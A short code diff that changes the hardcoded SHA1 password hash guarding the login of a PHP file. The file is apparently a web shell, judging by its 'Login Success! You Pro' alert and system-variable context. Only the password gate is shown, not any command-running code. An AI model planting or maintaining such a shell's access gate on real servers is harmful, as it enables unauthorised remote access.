@@ -127,7 +127,7 @@ $suffix = PHP_SHLIB_SUFFIX;
 $pathSep = PATH_SEPARATOR;
 
 //login
-$passwd = '386421265b975230158e1386249bc28c82ba8bd6';
+$passwd = '5c3c0d4ceddf2d80aad8df2c5e28e976c19e286a';
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
         echo "<script>alert('Login Success! You Pro');</script>";
